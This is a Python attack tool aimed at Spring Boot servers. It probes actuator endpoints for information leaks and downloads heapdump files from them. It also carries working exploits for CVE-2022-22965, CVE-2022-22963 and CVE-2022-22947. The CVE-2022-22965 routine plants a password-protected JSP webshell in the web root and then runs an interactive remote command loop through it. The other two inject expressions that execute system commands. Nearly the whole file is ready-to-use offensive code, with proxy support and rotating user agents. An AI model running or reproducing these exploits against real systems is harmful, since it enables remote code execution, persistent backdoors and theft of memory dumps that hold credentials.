#!/usr/bin/env python
# coding=utf-8
import requests, json, re, random
from time import sleep
from pub.com.outprint import OutPrintInfo,OutPrintInfoErr
from tqdm import tqdm
from rich.prompt import Prompt
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

ua = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
    "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00"]


class SpringBootScan:
    # 检查代理的使用
    def SpringBoot_Scan_Proxy(self, target):
        url = target["url"].strip('/ ')
        proxy = target["proxy"]
        if proxy:
            if "://" in proxy:
                proxy = proxy.split("://")[-1]
            proxies = {
                "http": "http://%(proxy)s/" % {'proxy': proxy},
                "https": "http://%(proxy)s/" % {'proxy': proxy}
            }
            OutPrintInfo("Spring", "================检测代理可用性中================")
            testurl = "https://www.baidu.com/"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0"}  # 响应头
            try:
                requests.packages.urllib3.disable_warnings()
                res = requests.get(testurl, timeout=10, proxies=proxies, verify=False, headers=headers)
                # 发起请求,返回响应码
                if res.status_code == 200:
                    OutPrintInfo("Spring", f"GET www.baidu.com 状态码为:[b bright_green]{str(res.status_code)}")
                    OutPrintInfo("Spring", "[b bright_green]代理可用，马上执行!")
            except KeyboardInterrupt:
                OutPrintInfo("Spring", "Ctrl + C 手动终止了进程")
                return
            except:
                OutPrintInfo("Spring", f"[b bright_red]代理不可用，请更换代理![/b bright_red]")
                return
        else:
            proxies = ''
        OutPrintInfo("1","对目标URL测试SpringBoot信息泄露端点")
        OutPrintInfo("2","对目标URL测试SpringBoot相关漏洞")
        OutPrintInfo("3","执行测试SpringBoot敏感文件泄露并下载模块")
        OutPrintInfo("4","全部执行")
        choose = Prompt.ask('[b cyan]选择对应编号执行任务')
        if choose == '1':
            self.url(url, proxies)
        elif choose == '2':
            self.vul(url, proxies)
        # choose = Prompt.ask('是否执行测试SpringBoot敏感文件泄露并下载模块[b bright_red](y/n)[/b bright_red]')
        elif choose == '3':
            self.dump(url, proxies)
        elif choose == '4':
            self.url(url, proxies)
            self.vul(url, proxies)
            self.dump(url, proxies)
        else:
            OutPrintInfoErr("请输入对应编号")





    def url(self, urllist, proxies):
        OutPrintInfo("Spring", "================开始对目标URL测试SpringBoot信息泄露端点================")
        with open("./dict/spring.txt", 'r') as web:
            webs = web.readlines()
            for web in webs:
                web = web.strip()
                if ('://' not in urllist):
                    urllist = str("http://") + str(urllist)
                if str(urllist[-1]) != "/":
                    u = urllist + "/" + web
                else:
                    u = urllist + web
                try:
                    header = {"User-Agent": random.choice(ua)}
                    requests.packages.urllib3.disable_warnings()
                    r = requests.get(url=u, headers=header, timeout=6, verify=False, proxies=proxies)  # 设置超时6秒
                    if r.status_code == 503:
                        return
                except KeyboardInterrupt:
                    OutPrintInfo("Spring", "Ctrl + C 手动终止了进程")
                    return
                except:
                    OutPrintInfo("Spring", f"URL为{u}的目标积极拒绝请求，予以跳过！")
                    break
                if r.status_code == 200:
                    OutPrintInfo("Spring", f"状态码[b bright_red]{str(r.status_code)}[/b bright_red]信息泄露URL为:[b bright_red]{u}[/b bright_red]页面长度为:[b bright_red]{str(len(r.content))}[/b bright_red]")
                else:
                    OutPrintInfo("Spring", f"状态码{str(r.status_code)}无法访问URL为:{u}")

    def dump(self, urllist, proxies):
        if ('://' not in urllist):
            urllist = str("http://") + str(urllist)
        if str(urllist[-1]) != "/":
            urllist = urllist + "/"
        try:
            requests.packages.urllib3.disable_warnings()
            r = requests.get(urllist, timeout=6, verify=False, proxies=proxies)  # 设置超时6秒
            if r.status_code == 503:
                return
        except KeyboardInterrupt:
            OutPrintInfo("Spring", "Ctrl + C 手动终止了进程")
            return
        except:
            OutPrintInfo("Spring", f"URL为{urllist}的目标积极拒绝请求，予以跳过！")
            return

        def download(url: str, fname: str, proxies: str):
            # 用流stream的方式获取url的数据
            requests.packages.urllib3.disable_warnings()
            resp = requests.get(url, timeout=6, stream=True, verify=False, proxies=proxies)
            # 拿到文件的长度，并把total初始化为0
            total = int(resp.headers.get('content-length', 0))
            # 打开当前目录的fname文件(名字你来传入)
            dir = f'./result/{fname}'
            # 初始化tqdm，传入总数，文件名等数据，接着就是写入，更新等操作了
            with open(dir, 'wb') as file, tqdm(
                    desc=fname,
                    total=total,
                    unit='iB',
                    unit_scale=True,
                    unit_divisor=1024,
            ) as bar:
                for data in resp.iter_content(chunk_size=1024):
                    size = file.write(data)
                    bar.update(size)

        OutPrintInfo("Spring", "================开始对目标URL测试SpringBoot敏感文件泄露并下载================")
        # 下载文件，并传入文件名
        url1 = urllist + "actuator/heapdump"
        url2 = urllist + "heapdump"
        url3 = urllist + "heapdump.json"
        url4 = urllist + "gateway/actuator/heapdump"
        url5 = urllist + "hystrix.stream"

        if str(requests.head(url1)) != "<Response [200]>":
            OutPrintInfo("Spring", "在 /actuator/heapdump 未发现heapdump敏感文件泄露")
        else:
            url = url1
            OutPrintInfo("Spring", f"发现[b bright_red]/actuator/heapdump[/b bright_red]敏感文件泄露,下载端点URL为:[b bright_red]{url}[/b bright_red]")
            download(url, "heapdump", proxies)
            OutPrintInfo("Spring", '文件保存于result文件夹')
            return

        if str(requests.head(url2)) != "<Response [200]>":
            OutPrintInfo("Spring", "在 /heapdump 未发现heapdump敏感文件泄露")
        else:
            url = url2
            OutPrintInfo("Spring", f"发现[b bright_red]/heapdump[/b bright_red]敏感文件泄露,下载端点URL为:[b bright_red]{url}[b bright_red]")
            download(url, "heapdump", proxies)
            OutPrintInfo("Spring", '文件保存于result文件夹')
            return
        if str(requests.head(url3)) != "<Response [200]>":
            OutPrintInfo("Spring", "在 /heapdump.json 未发现heapdump敏感文件泄露")
        else:
            url = url3
            OutPrintInfo("Spring", f"发现/heapdump.json敏感文件泄露,下载端点URL为:[b bright_red]{url}[/b bright_red]")
            download(url, "heapdump.json", proxies)
            OutPrintInfo("Spring", '文件保存于result文件夹')
            return
        if str(requests.head(url4)) != "<Response [200]>":
            OutPrintInfo("Spring", "在 /gateway/actuator/heapdump 未发现heapdump敏感文件泄露")
        else:
            url = url4
            OutPrintInfo("Spring", f"发现[b bright_red]/gateway/actuator/heapdump[/b bright_red]敏感文件泄露,下载端点URL为:[b bright_red]{url}[/b bright_red]")
            download(url, "heapdump", proxies)
            OutPrintInfo("Spring", '文件保存于result文件夹')
            return
        if str(requests.head(url5)) != ("<Response [401]>" or "<Response [200]>"):
            OutPrintInfo("Spring", "在 /hystrix.stream 未发现hystrix监控数据文件泄露，请手动验证")
        else:
            url = url5
            OutPrintInfo("Spring", f"发现[b bright_red]/hystrix.stream[/b bright_red]监控数据文件泄露,下载端点URL为:[b bright_red]{url}[/b bright_red]")
            download(url, "hystrix.stream", proxies)
            OutPrintInfo("Spring", '文件保存于result文件夹')
            return
        return

    def CVE_2022_22965(self, url, proxies):
        OutPrintInfo("Spring", "================开始对目标URL进行CVE-2022-22965漏洞利用================")
        Headers_1 = {
            "User-Agent": random.choice(ua),
            "suffix": "%>//",
            "c1": "Runtime",
            "c2": "<%",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        payload_linux = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        payload_win = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        payload_http = """?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        data1 = payload_linux
        data2 = payload_win
        getpayload = url + payload_http
        try:
            requests.packages.urllib3.disable_warnings()
            requests.post(url, headers=Headers_1, data=data1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
            sleep(1)
            requests.post(url, headers=Headers_1, data=data2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
            sleep(1)
            requests.get(getpayload, headers=Headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
            sleep(1)
            test = requests.get(url + "tomcatwar.jsp")
            if (test.status_code == 200) and ('aabysszg' in str(test.text)):
                OutPrintInfo("Spring", f"存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为:{url}tomcatwar.jsp?pwd=aabysszg&cmd=whoami")
                while 1:
                    cmd = input("请输入要执行的命令>>> ")
                    url_shell = url + "tomcatwar.jsp?pwd=aabysszg&cmd={}".format(cmd)
                    r = requests.get(url_shell)
                    resp = r.text
                    result = re.findall('([^\x00]+)\n', resp)[0]
                    OutPrintInfo("Spring", result)
            else:
                OutPrintInfo("Spring", "CVE-2022-22965漏洞不存在或者已经被利用,shell地址自行扫描")
        except Exception as e:
            OutPrintInfo("Spring", e)

    def CVE_2022_22963(self, url, proxies):
        OutPrintInfo("Spring", "================开始对目标URL进行CVE-2022-22963漏洞利用================")
        payload = f'T(java.lang.Runtime).getRuntime().exec("whoami")'

        data = 'test'
        header = {
            'spring.cloud.function.routing-expression': payload,
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': random.choice(ua),
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        path = 'functionRouter'
        url = url + path
        requests.packages.urllib3.disable_warnings()
        req = requests.post(url=url, headers=header, data=data, verify=False, proxies=proxies, timeout=6)
        code = req.status_code
        text = req.text
        rsp = '"error":"Internal Server Error"'

        if code == 500 and rsp in text:
            OutPrintInfo("Spring", f'{url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹shell')

        else:
            OutPrintInfo("Spring", "CVE-2022-22963漏洞不存在")


    def CVE_2022_22947(self, url, proxies):
        OutPrintInfo("Spring", "================开始对目标URL进行CVE-2022-22947漏洞利用================")
        headers1 = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': random.choice(ua),
            'Content-Type': 'application/json'
        }

        headers2 = {
            'User-Agent': random.choice(ua),
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        payload = '''{\r
                  "id": "hacktest",\r
                  "filters": [{\r
                    "name": "AddResponseHeader",\r
                    "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"}\r
                    }],\r
                  "uri": "http://example.com",\r
                  "order": 0\r
                }'''

        requests.packages.urllib3.disable_warnings()
        re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json, verify=False, proxies=proxies)
        re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, verify=False, proxies=proxies)
        re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, verify=False, proxies=proxies)
        re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, verify=False, proxies=proxies)
        re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, verify=False, proxies=proxies)
        if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
            OutPrintInfo("Spring", "Payload已经输出，回显结果如下:")
            OutPrintInfo("Spring", re3.text)
        else:
            OutPrintInfo("Spring", "CVE-2022-22947漏洞不存在")


    def vul(self, url, proxies):
        if ('://' not in url):
            url = str("http://") + str(url)
        if str(url[-1]) != "/":
            url = url + "/"
        try:
            requests.packages.urllib3.disable_warnings()
            r = requests.get(url, timeout=6, verify=False, proxies=proxies)  # 设置超时6秒
            if r.status_code == 503:
                return
        except KeyboardInterrupt:
            OutPrintInfo("Spring", "Ctrl + C 手动终止了进程")
            return
        except:
            OutPrintInfo("Spring", f"URL为{url}的目标积极拒绝请求，予以跳过！")
            return
        self.CVE_2022_22947(url, proxies)
        self.CVE_2022_22963(url, proxies)
        self.CVE_2022_22965(url, proxies)

    def main(self, target):
        self.SpringBoot_Scan_Proxy(target)